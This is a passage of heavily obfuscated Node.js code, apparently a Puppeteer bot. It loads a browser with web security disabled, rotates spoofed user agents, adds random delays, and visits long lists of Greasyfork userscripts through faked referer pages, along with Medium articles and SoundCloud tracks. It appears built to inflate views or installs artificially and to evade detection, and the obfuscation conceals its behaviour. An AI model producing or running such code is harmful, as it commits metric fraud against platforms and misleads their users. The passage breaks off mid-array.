function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1099 * 0x2 + 0x21de + -0xac);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a1 = c,
  a0 = b,
  Z = d;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1099 * 0x2 + 0x21de + -0xac);
    let h = e[f];
    if (b['VswIMC'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1 * -0x15e2 + 0x20b5 * 0x1 + 0x11 * -0xa3, s, t, u = 0x1893 + 0x1301 + -0x2b94; t = n['charAt'](u++); ~t && (s = r % (-0x20a6 + -0x125b + 0x25 * 0x161) ? s * (0xf1 * -0xa + 0x1d94 + -0x13ea) + t : t, r++ % (-0x1 * 0x1567 + -0x194 * 0x1 + -0xcb * -0x1d)) ? p += String['fromCharCode'](0x8d * 0xf + -0x349 + -0x3fb & s >> (-(0xdfc * 0x1 + -0x209 * 0xb + 0x1 * 0x869) * r & -0x1e4d + -0x3b * -0x62 + -0x1 * -0x7bd)) : 0x135b + -0x2 * -0xcb9 + -0x1 * 0x2ccd) {
          t = o['indexOf'](t);
        }
        for (let v = 0x222d + -0xf7c * -0x2 + 0x33 * -0x147, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x30a * -0x5 + 0x1 * -0x47d + -0xaa5))['slice'](-(0x335 * -0x1 + 0x86 * 0x47 + -0x21f3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x15 * -0x11d + -0x1c27 + 0x184 * 0x22,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x10ab + -0x956 + -0x13d * -0x15; u < 0xf2b * 0x1 + 0x2 * 0x113c + -0x30a3 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0x48c + -0x184 * 0x5 + 0x308; u < -0x1d37 + 0x26de + 0x8a7 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x23a7 + 0x9ff * 0x3 + 0x6aa), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x2d * 0x29 + 0x94f + 0x421 * -0x4, q = 0x2a1 * -0x2 + 0x11aa + -0xc68;
        for (let v = -0x1 * 0xec2 + 0xf + 0xeb3; v < n['length']; v++) {
          u = (u + (0x66e + 0x1f4b + -0x25b8)) % (-0x22a * -0x7 + -0x1138 + 0x312), q = (q + p[u]) % (-0xcf8 + -0xd3 * -0xd + 0x341), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1d3e + 0x20d * 0x5 + -0x1 * -0x13fd)]);
        }
        return t;
      };
      b['cQbxim'] = m, c = arguments, b['VswIMC'] = !![];
    }
    const j = e[0x156 * 0x17 + 0xd * 0xa1 + 0x1b1 * -0x17],
      k = f + j,
      l = c[k];
    return !l ? (b['AFlTKR'] === undefined && (b['AFlTKR'] = !![]), h = b['cQbxim'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (-0x25fa + -0x20a6 + 0x46a1))) + h;
}
async function randomWait() {
  return await wait(0x1a58 + 0xb1 * 0x15 + -0x2b * 0x7f + (-0x39b + -0x1 * 0x1567 + -0x2c8a * -0x1) * random()), -0x1 * -0x734 + 0x34a * -0x6 + 0xc89;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_GF': 0x1,
    'RPL2_SC2': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x0,
    'RPL2_RPRT': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math,
  NETWORK_PATIENCE = -0x3e7f + 0x218f * 0x1 + -0x4bd * -0x10 + (0x164f + -0x1369 * -0x1 + -0x50 * 0x60) * random(),
  MM_NETWORK_PATIENCE = (0x517 * 0x5 + -0x5df + -0x1 * 0x1391) * NETWORK_PATIENCE,
  me = random()['toString'](0x395 * 0x5 + -0x3df + -0xdfa * 0x1)['substring'](-0x3 * -0x92a + -0x14f * -0xb + 0x1 * -0x29df, 0x565 * -0x2 + 0x1 * -0x335 + -0x1 * -0xe09),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + Z(0x7) + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + Z(0x10),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': Z(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + Z(0xe) + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + a0(0x9, 'Y94o') + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + a0(0x3, 'eXSd') + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + a1(0x11) + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': Z(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + a0(0x1, 'woSO') + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x2, '(OOW')
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + a0(0xa, '&qiF') + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
